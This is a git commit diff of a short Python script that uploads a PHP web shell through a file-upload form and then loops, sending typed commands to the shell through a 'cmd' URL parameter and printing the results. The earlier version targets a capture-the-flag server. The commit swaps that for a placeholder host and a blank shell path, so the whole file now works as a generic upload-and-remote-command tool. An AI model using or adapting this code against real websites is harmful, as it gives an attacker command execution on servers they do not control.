6400088dd579230b062ea6ca32151f0bf2a2ae0a
Elliot Alderson <60684641+0x0elliot@users.noreply.github.com>
2020-11-23 17:59:36 +0530

    Update upload.py

--- upload.py
+++ upload.py
@@ -1,25 +1,21 @@
 import requests
 
-url="http://challenges.laptophackingcoffee.org:6464/?"
+url="http://example.com/upload" #insert link here
 
 #headers={'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundary5tBS5SLzak42PAxi'}
-
-with open('testone.php','rb') as f:
-    files={'upfile':f} #check the params first
+path_to_shell=""
+with open(path_to_shell,'rb') as f:
+    files={'file':f} #check the params first and confirm that this is alright.
     r=requests.post(url, files=files)
 
 while True:
-    cmd=input('enter command: ')
-    link=f"http://challenges.laptophackingcoffee.org:6464/images/testone.php?cmd={cmd}"
+    cmd=input('enter command: ') 
+    link=f"http://example.com/images/nameofshell.php?cmd={cmd}" #replace this line accordingly.
     if "upload it" in cmd:
         cmd=cmd.split()
         with open(cmd[2],'rb') as f:
-            files={'upfile':f}
+            files={'file':f}
             r=requests.post(url, files=files)
             print(r.text)
             continue
     r=requests.get(link)
-    if "gif file share" in r.text.lower():
-        print('retry time boi')
-        quit()
-    print(r.text)
